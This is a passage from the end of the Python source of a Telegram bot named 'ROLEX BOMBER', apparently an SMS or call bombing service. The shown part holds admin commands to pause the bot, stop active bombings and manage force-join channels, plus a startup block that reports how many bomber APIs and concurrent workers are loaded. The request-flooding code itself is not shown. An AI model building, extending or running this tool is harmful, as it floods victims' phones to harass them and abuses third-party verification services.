    _do_broadcast(m.chat.id, p[1].strip())

@bot.message_handler(commands=['stopbombings'])
def cmd_stopbombings(m):
    if not _is_admin(m): return bot.reply_to(m, "❌")
    c = 0
    with _bomb_lock:
        for k in list(active_bombings.keys()):
            e = active_bombings.get(k)
            if e is not None:
                e["stop"] = True; c += 1
    bot.reply_to(m, f"🛑 Stopped {c}.")

@bot.message_handler(commands=['stopbot'])
def cmd_stopbot(m):
    global BOT_PAUSED
    if not _is_admin(m): return bot.reply_to(m, "❌")
    BOT_PAUSED = True
    bot.reply_to(m, "🔴 <b>PAUSED</b>")

@bot.message_handler(commands=['startbot'])
def cmd_startbot(m):
    global BOT_PAUSED
    if not _is_admin(m): return bot.reply_to(m, "❌")
    BOT_PAUSED = False
    bot.reply_to(m, "🟢 <b>RUNNING</b>")

@bot.message_handler(commands=['addchannel'])
def cmd_addchannel(m):
    if not _is_admin(m): return
    p = (m.text or "").split(maxsplit=1)
    if len(p) < 2 or "|" not in p[1]:
        return bot.reply_to(m, "Usage: /addchannel @user | Name")
    cid, name = [x.strip() for x in p[1].split("|",1)]
    try:
        co = bot.get_chat(cid)
        title = co.title or name
        if cid.startswith("@"): url = f"https://t.me/{cid[1:]}"
        elif getattr(co, "username", None): url = f"https://t.me/{co.username}"
        else:
            try: url = bot.export_chat_invite_link(cid)
            except Exception as e:
                return bot.reply_to(m, f"❌ Need admin+invite perm.\n{esc(str(e)[:150])}")
    except Exception as e:
        return bot.reply_to(m, f"❌ {esc(str(e)[:150])}")
    if add_channel(cid, title, url):
        bot.reply_to(m, f"✅ Added <b>{esc(title)}</b>")
    else:
        bot.reply_to(m, "⚠️ Exists or DB fail.")

@bot.message_handler(commands=['delchannel'])
def cmd_delchannel(m):
    if not _is_admin(m): return
    p = (m.text or "").split()
    if len(p) != 2: return bot.reply_to(m, "Usage: /delchannel @user")
    if remove_channel(p[1]):
        bot.reply_to(m, f"✅ Removed {esc(p[1])}")
    else:
        bot.reply_to(m, "❌ Not found.")

@bot.message_handler(commands=['listchannels'])
def cmd_listchannels(m):
    if not _is_admin(m): return
    chans = get_all_channels()
    if not chans: return bot.reply_to(m, "ℹ️ None configured.")
    lines = ["🔒 <b>Force-Join Channels</b>",""]
    for c in chans:
        st = "🟢" if c["enabled"] else "🔴"
        lines.append(f"{st} <b>{esc(c['name'])}</b>\n   <code>{esc(c['chat_id'])}</code>")
    bot.reply_to(m, "\n".join(lines))

# ============= MAIN =============
if __name__ == "__main__":
    if not BOT_TOKEN:
        raise SystemExit("BOT_TOKEN env var missing")
    if not DATABASE_URL:
        raise SystemExit("DATABASE_URL env var missing")
    init_db()
    sweep_orphans()
    _start_health_server()
    threading.Thread(target=_keepalive, daemon=True).start()
    print("=" * 56)
    print("  ROLEX BOMBER — POSTGRES / RENDER EDITION")
    print("=" * 56)
    print(f"APIs loaded : {len(BOMBER_APIS)}")
    print(f"Workers     : {CONCURRENT_WORKERS}")
    print(f"Timeout     : {REQUEST_TIMEOUT}s")
    print(f"Channels    : {len(get_all_channels(only_enabled=True))} active")
    print("Running.\n")
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=25,
                                 skip_pending=True)
        except Exception as e:
            print(f"polling died: {e} — restarting in 5s")
            time.sleep(5)
